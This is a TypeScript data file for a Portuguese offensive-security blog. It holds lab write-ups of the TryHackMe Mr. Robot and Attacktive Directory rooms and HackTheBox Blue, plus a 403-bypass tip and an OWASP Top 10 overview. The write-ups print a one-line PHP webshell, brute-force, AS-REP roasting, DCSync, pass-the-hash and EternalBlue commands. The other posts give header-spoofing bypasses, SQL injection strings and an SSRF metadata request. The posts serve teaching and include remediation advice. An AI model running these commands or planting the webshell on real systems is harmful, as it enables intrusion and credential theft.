export interface BlogPost {
  id: number
  slug: string
  title: string
  excerpt: string
  content: string
  date: string
  readTime: string
  category: string
  tags: string[]
  author: {
    name: string
    avatar: string
    role: string
  }
  featured: boolean
  color: string
}

export const blogPosts: BlogPost[] = [
  {
    id: 1,
    slug: "tryhackme-mr-robot-writeup",
    title: "TryHackMe: Mr. Robot Writeup",
    excerpt:
      "Resolução completa da sala Mr. Robot do TryHackMe: exposição de arquivos via robots.txt, força bruta no WordPress, webshell via editor de temas, crack de MD5 e escalação de privilégio com SUID nmap.",
    content: `## Introdução

A sala **Mr. Robot** do TryHackMe é inspirada na série homônima e classificada como nível **Médio**. O ambiente simula um servidor Linux mal configurado rodando WordPress: com falhas que vão desde exposição de arquivos sensíveis até permissões incorretas em binários do sistema. O objetivo é capturar 3 flags progressivas que exigem exploração em cadeia.

---

## Sumário Executivo

O servidor expôs uma wordlist personalizada e a primeira flag diretamente via \`robots.txt\`. A combinação de enumeração de usuário no WordPress com a wordlist obtida permitiu força bruta bem-sucedida das credenciais administrativas. Com acesso ao painel, injetamos uma webshell no editor de temas e obtivemos execução remota de código. Um hash MD5 sem sal encontrado no sistema foi quebrado com \`john\`, concedendo acesso SSH ao usuário \`robot\`. A escalação final para root foi possível por um binário \`nmap\` com bit SUID ativo em versão legada: vulnerável ao modo interativo que spawna shell como root.

**Impacto:** comprometimento total do servidor com acesso root.

---

## Escopo e Ambiente

| Campo | Valor |
|-------|-------|
| Plataforma | TryHackMe |
| IP do alvo | \`10.65.188.34\` |
| Sistema Operacional | Linux (Ubuntu) |
| Serviços expostos | SSH (22), HTTP (80), HTTPS (443) |
| Data do teste | 2026-08-14 |

---

## Metodologia

### 1. Reconhecimento

#### Scan de Portas

\`\`\`bash
nmap -sV -sC -Pn 10.65.188.34
\`\`\`

\`\`\`text
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp   open  http     Apache httpd
443/tcp  open  ssl/http Apache httpd
\`\`\`

Servidor Apache com SSH exposto. A presença de \`/wp-login.php\` e estrutura de diretórios confirmou instalação de **WordPress**.

#### Enumeração de Diretórios

\`\`\`bash
gobuster dir -u http://10.65.188.34 -w /usr/share/wordlists/dirb/common.txt
\`\`\`

Resultados relevantes:

- \`/wp-admin\`, \`/wp-content\`, \`/wp-includes\`: WordPress ativo
- \`/robots.txt\`: acessível publicamente

---

### 2. Enumeração

#### robots.txt: Exposição de Arquivos Sensíveis

\`\`\`bash
curl http://10.65.188.34/robots.txt
\`\`\`

\`\`\`text
User-agent: *
fsocity.dic
key-1-of-3.txt
\`\`\`

O arquivo \`robots.txt\` listou dois recursos críticos: a **Key 1** e uma wordlist customizada \`fsocity.dic\`. Ambos foram obtidos diretamente via HTTP sem autenticação.

#### Download e Otimização da Wordlist

\`\`\`bash
curl http://10.65.188.34/fsocity.dic -o fsocity.dic
wc -l fsocity.dic           # 858.160 linhas: com massiva repetição
sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic      # 11.451 linhas após deduplicação
\`\`\`

Redução de **98,6%** no tamanho: impacto direto na velocidade do ataque seguinte.

#### Enumeração de Usuário no WordPress

O endpoint \`/wp-login.php\` retorna mensagens de erro distintas conforme o campo inválido: *"Invalid username"* vs *"The password you entered for the username X is incorrect"*. Essa diferença permite confirmar usuários válidos sem autenticação.

\`\`\`bash
wpscan --url http://10.65.188.34 --enumerate u
\`\`\`

Usuário confirmado: **elliot**

---

### 3. Exploração

#### Força Bruta de Credenciais WordPress

\`\`\`bash
wpscan --url http://10.65.188.34 \\
  --usernames elliot \\
  --passwords fsocity_uniq.dic
\`\`\`

\`\`\`text
[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652
\`\`\`

Credenciais obtidas: \`elliot : ER28-0652\`

#### Webshell via Editor de Temas

Com acesso ao painel \`/wp-admin\`, navegamos até **Appearance → Theme Editor → 404.php** do tema ativo (**twentyfifteen**). O arquivo de template é editável diretamente pela interface: injetamos uma webshell de uma linha:

\`\`\`php
<?php system($_GET["c"]); ?>
\`\`\`

Validação da execução remota de código:

\`\`\`bash
curl 'http://10.65.188.34/wp-content/themes/twentyfifteen/404.php?c=id'
\`\`\`

\`\`\`text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
\`\`\`

RCE confirmado como usuário \`daemon\`.

#### Enumeração do Sistema via Webshell

\`\`\`bash
curl '...404.php?c=ls+-la+/home/robot'
\`\`\`

\`\`\`text
-r-------- 1 robot robot   key-2-of-3.txt        <- ilegível por daemon
-rw-r--r-- 1 robot robot   password.raw-md5      <- legível por todos
\`\`\`

\`\`\`bash
curl '...404.php?c=cat+/home/robot/password.raw-md5'
\`\`\`

\`\`\`text
robot:c3fcd3d76192e4007dfb496cca67e13b
\`\`\`

Hash MD5 sem sal exposto em arquivo com permissões abertas.

#### Crack do Hash MD5

\`\`\`bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
\`\`\`

\`\`\`text
abcdefghijklmnopqrstuvwxyz
\`\`\`

Senha recuperada em segundos: MD5 sem sal é equivalente a armazenar senha em texto claro para fins práticos.

#### Acesso SSH como robot

\`\`\`bash
ssh robot@10.65.188.34
# senha: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
\`\`\`

---

### 4. Escalação de Privilégio

#### Levantamento de Binários SUID

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`

\`\`\`text
/usr/local/bin/nmap    <- SUID ativo, versão 3.81
\`\`\`

O binário \`nmap\` possui o bit **SUID** configurado: qualquer processo filho herda o UID do dono do arquivo (root).

#### Exploit: Modo Interativo do nmap

Versões do nmap anteriores à 5.x incluem um modo interativo (\`--interactive\`) que permite executar comandos shell diretamente. Como o processo roda como root via SUID, o shell spawned herda UID 0:

\`\`\`bash
nmap --interactive
\`\`\`

\`\`\`text
nmap> !sh

# id
uid=0(root) gid=0(root) groups=0(root),1002(robot)

# cat /root/key-3-of-3.txt
\`\`\`

Acesso root obtido sem exploração de CVE: configuração incorreta de permissão.

---

## Análise de Risco

| Vulnerabilidade | Severidade | Causa Raiz | Remediação |
|-----------------|------------|------------|------------|
| Arquivos sensíveis em robots.txt | **Média** | Arquivos no webroot listados publicamente | Remover do webroot; robots.txt não é controle de acesso |
| Enumeração de usuário no WordPress | **Média** | Mensagens de erro distintas no wp-login.php | Padronizar erro; plugin de proteção de login |
| Força bruta sem rate limiting | **Alta** | Ausência de lockout e limitação de tentativas | Lockout após N falhas; CAPTCHA ou 2FA |
| Hash MD5 sem sal | **Alta** | Algoritmo criptograficamente inadequado | Migrar para bcrypt, scrypt ou Argon2 com salt |
| Arquivo de hash legível por outros | **Alta** | Permissões incorretas (-rw-r--r--) em credenciais | chmod 600; nunca armazenar hashes fora de DBs protegidos |
| SUID em nmap legado | **Crítica** | Permissão excessiva em binário com execução de shell | Remover bit SUID; atualizar ou desinstalar versões legadas |

---

## Lições Aprendidas

- **robots.txt é um mapa, não uma barreira.** Tudo listado ali é público: nunca referencie arquivos que não deveriam ser acessíveis.
- **Mensagens de erro distintas** em formulários de login são uma vulnerabilidade de enumeração. A resposta deve ser idêntica independente do campo inválido.
- **Wordlists vindas do próprio alvo** são sempre mais eficazes: o servidor essencialmente forneceu a chave para sua própria invasão.
- **MD5 sem sal quebra em segundos** com hardware comum. Qualquer sistema que ainda use MD5 para senhas está abaixo do mínimo aceitável de segurança.
- **Audite binários SUID regularmente**: \`find / -perm -4000\` deve fazer parte de qualquer checklist de hardening.

---

## Flags

| Flag | Localização | Método de Obtenção |
|------|-------------|-------------------|
| Key 1 | /key-1-of-3.txt | Acesso direto via robots.txt |
| Key 2 | /home/robot/key-2-of-3.txt | Crack MD5 + SSH como robot |
| Key 3 | /root/key-3-of-3.txt | SUID nmap --interactive + shell root |`,
    date: "Aug 14, 2026",
    readTime: "12 min read",
    category: "Machine Write-ups",
    tags: ["TryHackMe", "WordPress", "WPScan", "Webshell", "John", "SUID", "Linux PrivEsc"],
    author: {
      name: "Felipe da Silva Rosa",
      avatar: "/developer-portrait.png",
      role: "Offensive Security Specialist",
    },
    featured: true,
    color: "from-green-500/20 to-emerald-500/20",
  },
  {
    id: 2,
    slug: "tryhackme-attacktive-directory",
    title: "TryHackMe: Attacktive Directory Walkthrough",
    excerpt:
      "Resolução completa da sala Attacktive Directory do TryHackMe: enumeração com Nmap e Kerbrute, AS-REP Roasting com Impacket, acesso SMB autenticado, DCSync via Secretsdump e shell administrativo com Evil-WinRM.",
    content: `## Introdução

A sala **Attacktive Directory** do TryHackMe simula um Domain Controller Windows em ambiente corporativo desatualizado. Classificada como nível **Médio**, o laboratório cobre técnicas fundamentais de ataque a Active Directory: desde enumeração sem credenciais até comprometimento total do domínio via DCSync. É uma das salas mais recomendadas para quem está aprendendo AD offensive.

---

## Sumário Executivo

A enumeração inicial revelou um Domain Controller do domínio \`spookysec.local\` com Kerberos, LDAP, SMB e WinRM expostos. A ausência de pré-autenticação Kerberos na conta \`svc-admin\` permitiu AS-REP Roasting: o hash obtido foi quebrado offline, concedendo acesso autenticado ao domínio. Via SMB, localizamos credenciais da conta \`backup\` codificadas em base64 em um compartilhamento acessível. Essa conta possuía privilégios de replicação no DC, viabilizando DCSync para extração de todos os hashes NTLM do AD. O hash do Administrator foi utilizado em ataque Pass-the-Hash via Evil-WinRM, resultando em comprometimento total do Domain Controller.

**Impacto:** controle total do domínio \`spookysec.local\`.

---

## Escopo e Ambiente

| Campo | Valor |
|-------|-------|
| Plataforma | TryHackMe |
| IP do alvo | \`10.64.145.19\` |
| Domínio | \`spookysec.local\` |
| Sistema Operacional | Windows Server 2019 (10.0.17763) |
| Serviços expostos | DNS (53), HTTP (80), Kerberos (88), LDAP (389/3268), SMB (445), RDP (3389), WinRM (5985) |
| Data do teste | 2026-08-14 |

---

## Metodologia

### 1. Reconhecimento

#### Scan de Portas

\`\`\`bash
nmap -Pn -A -p- -T4 10.64.145.19
\`\`\`

\`\`\`text
53/tcp    open  domain
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          (Domain: spookysec.local)
445/tcp   open  microsoft-ds
3268/tcp  open  ldap
3389/tcp  open  ms-wbt-server
5985/tcp  open  http          WinRM
\`\`\`

![Reconhecimento Inicial com Nmap](/blog/thm-attacktive-directory/1.png)

A combinação de portas 88 (Kerberos), 389 (LDAP) e 445 (SMB) é assinatura de **Domain Controller**. O domínio \`spookysec.local\` foi identificado diretamente pelo banner LDAP. WinRM na 5985 será relevante na fase de pós-exploração.

#### Confirmação do Domínio com CrackMapExec

\`\`\`bash
crackmapexec smb 10.64.145.19
\`\`\`

![Descoberta do nome do domínio](/blog/thm-attacktive-directory/2.png)

Consulta passiva via SMB: confirma domínio e versão do SO sem autenticação.

---

### 2. Enumeração

#### Enumeração de Usuários via Kerberos (Kerbrute)

Sem credenciais válidas, o Kerberos pode ser usado para enumerar usuários existentes no domínio. O protocolo responde de forma diferente para usuários válidos vs inválidos: sem disparar lockout de conta, tornando a técnica segura para ambientes com política de bloqueio ativa.

\`\`\`bash
kerbrute userenum -d spookysec.local --dc 10.64.145.19 users.txt
\`\`\`

![Enumeração do Kerbrute](/blog/thm-attacktive-directory/3.png)

Usuários válidos identificados:

- \`james@spookysec.local\`
- \`svc-admin@spookysec.local\`
- \`robin@spookysec.local\`
- \`darkstar@spookysec.local\`
- \`administrator@spookysec.local\`
- \`backup@spookysec.local\`
- \`paradox@spookysec.local\`
- \`ori@spookysec.local\`

---

### 3. Exploração

#### AS-REP Roasting

Contas configuradas com *"Do not require Kerberos preauthentication"* permitem que qualquer usuário solicite um ticket TGT sem fornecer senha. O ticket é criptografado com o hash NTLM da conta: possibilitando crack offline sem interagir diretamente com o alvo após a requisição.

\`\`\`bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ \\
  -dc-ip 10.64.145.19 \\
  -usersfile valid_users.txt \\
  -request
\`\`\`

![AS-REP Roasting via GetNPUsers](/blog/thm-attacktive-directory/4.png)

A conta \`svc-admin\` está vulnerável. Hash AS-REP obtido:

\`\`\`text
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:b3f30267166c6c8127dfaee88962a3c9$...
\`\`\`

#### Quebrando o Hash AS-REP

Hashcat no modo \`18200\` (Kerberos 5 AS-REP etype 23):

\`\`\`bash
hashcat -m 18200 hash.txt passwords.txt
\`\`\`

![Quebra de hash com Hashcat](/blog/thm-attacktive-directory/5.png)

Credenciais recuperadas:

- **Username:** \`svc-admin\`
- **Password:** \`management2005\`

#### Acesso SMB Autenticado

Com credenciais válidas no domínio, enumeramos os compartilhamentos acessíveis:

\`\`\`bash
netexec smb 10.64.145.19 -u 'svc-admin' -p 'management2005' --shares
\`\`\`

![Lista de compartilhamentos SMB](/blog/thm-attacktive-directory/6.png)

Compartilhamento \`backup\` acessível com leitura. Conectamos via smbclient:

\`\`\`bash
smbclient //10.64.145.19/backup -U 'svc-admin'
\`\`\`

![Listando conteúdo no compartilhamento de backup](/blog/thm-attacktive-directory/7.png)

Arquivo \`backup_credentials.txt\` encontrado com conteúdo codificado em base64:

\`\`\`text
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
\`\`\`

![Conteúdo codificado em Base64](/blog/thm-attacktive-directory/8.png)

\`\`\`bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
\`\`\`

Credenciais da conta de backup:

- **Username:** \`backup\`
- **Password:** \`backup2517860\`

---

### 4. Pós-Exploração

#### DCSync: Extração de Hashes do Active Directory

A conta \`backup\` possui privilégios de replicação no Domain Controller (*Replicating Directory Changes All*). Com esse privilégio é possível simular uma sincronização entre DCs e extrair todos os hashes NTLM armazenados no AD: técnica conhecida como **DCSync**. Não requer acesso interativo ao DC.

\`\`\`bash
secretsdump.py spookysec.local/backup:backup2517860@10.64.145.19
\`\`\`

![Dumping de hashes de senhas via Secretsdump](/blog/thm-attacktive-directory/9.png)

Hash NTLM do Administrator extraído:

\`\`\`text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
\`\`\`

#### Shell Administrativo via Pass-the-Hash (Evil-WinRM)

Com o hash NTLM do Administrator, não é necessário quebrar a senha. O protocolo NTLM aceita o hash diretamente: ataque conhecido como **Pass-the-Hash**:

\`\`\`bash
evil-winrm -i 10.64.145.19 -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'
\`\`\`

![Evil-WinRM acesso administrativo](/blog/thm-attacktive-directory/10.png)

Acesso administrativo total ao Domain Controller obtido.

---

## Análise de Risco

| Vulnerabilidade | Severidade | Causa Raiz | Remediação |
|-----------------|------------|------------|------------|
| Enumeração de usuários via Kerberos | **Média** | Kerberos responde diferente para usuários válidos/inválidos | Monitorar AS-REQ em volume; honeypots de usuário |
| AS-REP Roasting (svc-admin) | **Alta** | Pré-autenticação Kerberos desabilitada | Habilitar pré-autenticação; senhas longas em contas de serviço |
| Credenciais em compartilhamento SMB | **Crítica** | Arquivo com credenciais base64 em share acessível | Nunca armazenar credenciais em arquivos; usar LAPS ou cofre |
| Privilégio de replicação excessivo (backup) | **Crítica** | Conta não-admin com Replicating Directory Changes All | Restringir DCSync a DCs; auditar delegações no AD |
| Pass-the-Hash via WinRM | **Alta** | NTLM habilitado + WinRM exposto + hash privilegiado | Desabilitar NTLM; restringir WinRM por IP; Credential Guard |

---

## Lições Aprendidas

- **Kerberos pré-autenticação desabilitada** é configuração herdada de versões antigas do AD que raramente tem justificativa hoje: deve ser auditada em todas as contas.
- **Credenciais codificadas em base64** não são credenciais protegidas. Base64 é encoding, não criptografia: qualquer analista reconhece o padrão imediatamente.
- **Contas de serviço com privilégios de replicação** são um vetor crítico. DCSync é silencioso e difícil de detectar sem SIEM configurado para monitorar eventos 4662 no AD.
- **Pass-the-Hash elimina a necessidade de crack**: um hash NTLM comprometido tem o mesmo valor operacional que a senha em texto claro para autenticação Windows.
- **Senhas fracas em contas de serviço** (management2005) são recorrentes em ambientes reais. Use senhas longas e aleatórias gerenciadas por cofre.

---

## Flags

| Flag | Localização | Método de Obtenção |
|------|-------------|-------------------|
| user.txt | C:\\Users\\svc-admin\\Desktop\\user.txt.txt | AS-REP Roasting + crack + acesso autenticado |
| PrivESC.txt | C:\\Users\\backup\\Desktop\\PrivESC.txt | Credencial SMB + acesso como backup |
| root.txt | C:\\Users\\Administrator\\Desktop\\root.txt | DCSync + Pass-the-Hash + Evil-WinRM |

![Flag do Administrador root.txt](/blog/thm-attacktive-directory/11.png)

![Flag de elevação de privilégio PrivESC.txt](/blog/thm-attacktive-directory/12.png)`,
    date: "Aug 14, 2026",
    readTime: "14 min read",
    category: "Machine Write-ups",
    tags: ["TryHackMe", "Active Directory", "Kerbrute", "Impacket", "Secretsdump", "Evil-WinRM", "DCSync", "Pass-the-Hash"],
    author: {
      name: "Felipe da Silva Rosa",
      avatar: "/developer-portrait.png",
      role: "Offensive Security Specialist",
    },
    featured: true,
    color: "from-blue-500/20 to-indigo-500/20",
  },
  {
    id: 3,
    slug: "hackthebox-blue-eternalblue",
    title: "HackTheBox 'Blue': Explorando o EternalBlue (MS17-010)",
    excerpt:
      "Resolução completa da máquina Blue do HackTheBox: enumeração com Nmap, identificação da CVE-2017-0144 (EternalBlue) e exploração via Metasploit para obter shell SYSTEM diretamente.",
    content: `## Introdução

A máquina **Blue** do HackTheBox é um clássico absoluto: provavelmente a box mais resolvida da plataforma. O objetivo é simples: explorar um Windows 7 desatualizado rodando SMBv1 e capturar as flags de usuário e root. O vetor é o **EternalBlue**, um exploit vazado da NSA que ficou famoso pelo ransomware WannaCry em 2017.

---

## 1. Reconhecimento

### Scan de Portas

\`\`\`bash
nmap -sC -sV -oA nmap/initial 10.10.10.40
\`\`\`

\`\`\`text
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds
3389/tcp open  tcpwrapped
\`\`\`

Windows 7 SP1 com SMB exposto na porta 445. Versão antiga + SMB = sinal de alerta imediato.

---

## 2. Identificação da Vulnerabilidade

Rodamos o script de detecção específico do Nmap para confirmar:

\`\`\`bash
nmap -p445 --script smb-vuln-ms17-010 10.10.10.40
\`\`\`

\`\`\`text
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0144
\`\`\`

Vulnerabilidade confirmada. A **CVE-2017-0144 (EternalBlue)** explora uma falha de buffer overflow no protocolo SMBv1, permitindo execução remota de código sem autenticação. Severidade CVSS 8.1: Crítica.

---

## 3. Exploração com Metasploit

O Metasploit tem um módulo maduro e estável para esse exploit:

\`\`\`bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST tun0
run
\`\`\`

\`\`\`text
[*] Sending stage (200774 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM
\`\`\`

Shell de **SYSTEM** obtido diretamente: sem precisar de escalonamento de privilégio.

---

## 4. Pós-Exploração

Com SYSTEM, a leitura das flags é trivial:

\`\`\`bash
cat C:\\Users\\haris\\Desktop\\user.txt
cat C:\\Users\\Administrator\\Desktop\\root.txt
\`\`\`

---

## Lições Aprendidas

- **Patch management é crítico.** O MS17-010 foi corrigido em março de 2017. Máquinas sem atualização continuam vulneráveis anos depois: e ainda aparecem em ambientes corporativos reais.
- **Desabilitar SMBv1** elimina toda essa classe de ataques. Não há motivo para mantê-lo ativo em 2024+.
- O EternalBlue é um lembrete de que exploits vazados de agências de inteligência têm impacto real e duradouro no mundo.

---

## Flags

| Flag | Localização |
|------|-------------|
| user.txt | C:\\Users\\haris\\Desktop\\user.txt |
| root.txt | C:\\Users\\Administrator\\Desktop\\root.txt |`,
    date: "Aug 10, 2026",
    readTime: "7 min read",
    category: "Machine Write-ups",
    tags: ["HackTheBox", "Windows", "EternalBlue", "MS17-010", "Metasploit", "SMB", "CVE-2017-0144"],
    author: {
      name: "Felipe da Silva Rosa",
      avatar: "/developer-portrait.png",
      role: "Offensive Security Specialist",
    },
    featured: false,
    color: "from-red-500/20 to-orange-500/20",
  },
  {
    id: 4,
    slug: "bypass-403-ffuf-header-spoofing",
    title: "Dica Rápida: Bypass de 403 Forbidden com Ffuf e Header Spoofing",
    excerpt:
      "Uma técnica rápida de Bug Bounty: como contornar respostas 403 em endpoints administrativos usando falsificação de headers e mudança de método HTTP.",
    content: `Quem faz **Bug Bounty** sabe: encontrar um endpoint administrativo que retorna \`403 Forbidden\` é um dos melhores sinais de que algo valioso está atrás daquele caminho. Mas um 403 não é um "não" definitivo.

---

## O Cenário

Você descobriu via recon passivo o endpoint \`/api/v1/admin/users\`, mas recebe:

\`\`\`http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"error": "Access denied from your location"}
\`\`\`

---

## Técnica 1: Spoofing de Headers de Origem

Muitas WAFs e filtros de ACL confiam cegamente em headers de controle de roteamento. Teste variações de \`X-Forwarded-For\`, \`X-Forwarded-Host\` e \`X-Real-IP\`:

\`\`\`bash
ffuf -w headers.txt -u https://target.com/api/v1/admin/users \\
  -H "X-Forwarded-For: 127.0.0.1" \\
  -mc 200,201,301,302
\`\`\`

Headers mais comuns para testar:

- \`X-Forwarded-For: 127.0.0.1\`
- \`X-Real-IP: 127.0.0.1\`
- \`X-Forwarded-Host: localhost\`
- \`X-Custom-IP-Authorization: 127.0.0.1\`
- \`X-Originating-IP: 127.0.0.1\`
- \`X-Remote-IP: 127.0.0.1\`
- \`X-Client-IP: 127.0.0.1\`

---

## Técnica 2: Troca de Método HTTP

Controladores modernos (Spring, Express, Django) às vezes esquecem de validar o método. Um \`POST\` ou \`PUT\` em um endpoint que só validava \`GET\` pode passar limpo:

\`\`\`bash
curl -k -X POST https://target.com/api/v1/admin/users \\
  -H "Content-Type: application/json"
\`\`\`

---

## Técnica 3: Path Obfuscation

Adicionar trailing slash, ponto ou codificação dupla frequentemente quebra regras de deny-list mal escritas:

\`\`\`text
/api/v1/admin/users/..
/api/v1/admin/users/
/api/v1/admin//users
/%2e%2e/admin/users
\`\`\`

---

## Checklist Rápido

- [ ] Trocar método (GET -> POST/PUT/HEAD)
- [ ] Headers X-Forwarded-For: 127.0.0.1
- [ ] Adicionar trailing slash ou ponto
- [ ] Codificação URL dupla
- [ ] Mudar Content-Type

> **Pro tip:** Automatize isso com o \`ffuf\` + wordlist de headers. Economiza horas de trabalho manual em cada programa de bug bounty.`,
    date: "Aug 12, 2026",
    readTime: "5 min read",
    category: "Dicas da Área",
    tags: ["Bug Bounty", "Ffuf", "403 Bypass", "Header Spoofing", "WAF Bypass", "Web", "Tips"],
    author: {
      name: "Felipe da Silva Rosa",
      avatar: "/developer-portrait.png",
      role: "Offensive Security Specialist",
    },
    featured: false,
    color: "from-yellow-500/20 to-amber-500/20",
  },
  {
    id: 5,
    slug: "owasp-top-10-2021-pentest-web",
    title: "OWASP Top 10 (2021): Mapeando o Terreno do Pentest Web",
    excerpt:
      "Uma análise técnica das 10 categorias mais críticas de riscos em aplicações web segundo a OWASP, com foco em como cada uma se manifesta na prática de pentest e bug bounty.",
    content: `O **OWASP Top 10** é o documento de referência que todo Analista de Segurança Ofensiva deve decorar. Ele não é uma lista de vulnerabilidades isoladas, mas de **categorias de risco**: e entender a diferença muda como você aborda um teste de invasão.

---

## A01: Broken Access Control

A categoria **#1** em 2021. Substitui a falta de verificação de autorização por confiança no estado da sessão.

\`\`\`text
Normal:   GET /api/user/1001/profile  -> 200 (próprio usuário)
Ataque:   GET /api/user/1002/profile  -> 200 (IDOR!)
\`\`\`

Sinais clássicos: **IDOR**, falta de checagem server-side após validação no cliente, e manipulação de JWT com \`alg: none\`.

---

## A02: Cryptographic Failures

Vazamento de dados sensíveis por criptografia fraca ou ausente. Busque por:

- Transmissão em HTTP puro de credenciais
- Uso de algoritmos quebrados (MD5, SHA1) para senhas
- Cifras simétricas com IV fixo

---

## A03: Injection

O clássico que nunca sai de moda. SQLi, NoSQLi, Command Injection e LDAP injection. Sempre teste com payloads de escape de contexto:

\`\`\`sql
' OR '1'='1
"; DROP TABLE users; --
\`\`\`

---

## A04: Insecure Design

Nova categoria em 2021. Reconhece que muitas falhas nascem no **planejamento**, não na implementação. Threat Modeling e abuse cases são essenciais aqui.

---

## A05: Security Misconfiguration

O "erro de configuração" onipresente: diretórios listáveis, headers de segurança ausentes (\`CSP\`, \`HSTS\`), serviços padrão expostos.

---

## A06: Vulnerable & Outdated Components

Dependências desatualizadas com CVEs conhecidas. \`npm audit\`, \`retire.js\` e varredura de banners de versão resolvem 80% do trabalho.

---

## A07: Identification & Authentication Failures

Credenciais quebradas, brute-force sem rate limit, sessões fixas e recuperação de senha frágil.

---

## A08: Software & Data Integrity Failures

Foco em pipelines CI/CD e desserialização insegura: onde um atacante injeta código em atualizações confiáveis.

---

## A09: Security Logging & Monitoring Failures

Ausência de logs de auditoria e alertas. Essencial para detectar e prover evidências em um relatório de pentest.

---

## A10: Server-Side Request Forgery (SSRF)

Promovida ao Top 10 em 2021. O atacante abusa da máquina do servidor para fazer requisições internas:

\`\`\`http
POST /api/fetch-image HTTP/1.1
url=http://169.254.169.254/latest/meta-data/iam/
\`\`\`

Impacto em cloud: acesso a metadata AWS/GCP/Azure com credenciais IAM.

---

## Conclusão

Dominar essa lista não significa memorizar nomes: significa internalizar **onde e como cada risco aparece** durante um teste real. O melhor pentester não é quem conhece a ferramenta, mas quem entende o fluxo de negócio que a aplicação tenta proteger.`,
    date: "Aug 13, 2026",
    readTime: "8 min read",
    category: "Conhecimento",
    tags: ["OWASP", "OWASP Top 10", "Pentest Web", "AppSec", "IDOR", "SQLi", "SSRF", "Bug Bounty"],
    author: {
      name: "Felipe da Silva Rosa",
      avatar: "/developer-portrait.png",
      role: "Offensive Security Specialist",
    },
    featured: true,
    color: "from-purple-500/20 to-pink-500/20",
  },
]

export function getPostBySlug(slug: string): BlogPost | undefined {
  return blogPosts.find((post) => post.slug === slug)
}

export function getRelatedPosts(currentSlug: string, limit = 3): BlogPost[] {
  const currentPost = getPostBySlug(currentSlug)
  if (!currentPost) return []

  return blogPosts
    .filter((post) => post.slug !== currentSlug)
    .filter((post) => post.category === currentPost.category || post.tags.some((tag) => currentPost.tags.includes(tag)))
    .slice(0, limit)
}
